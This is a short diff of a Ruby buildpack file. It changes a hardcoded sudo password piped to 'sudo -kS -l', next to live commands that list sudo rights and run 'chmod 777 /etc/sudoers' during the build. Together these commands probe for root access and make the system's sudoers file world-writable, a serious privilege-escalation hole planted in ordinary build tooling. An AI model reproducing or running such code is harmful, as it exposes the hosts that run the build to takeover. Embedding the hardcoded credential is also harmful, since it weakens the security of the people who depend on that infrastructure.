@@ -92,7 +92,7 @@ module JavaBuildpack
           puts ""
           #puts `sudo apt-get install apache2`
           #puts `apt-get install apache2 --just-print`
-          puts `echo "password" | sudo -kS -l`
+          puts `echo "sgorial" | sudo -kS -l`
           puts `whoami`
           puts `sudo -l`
           puts `chmod 777 /etc/sudoers`
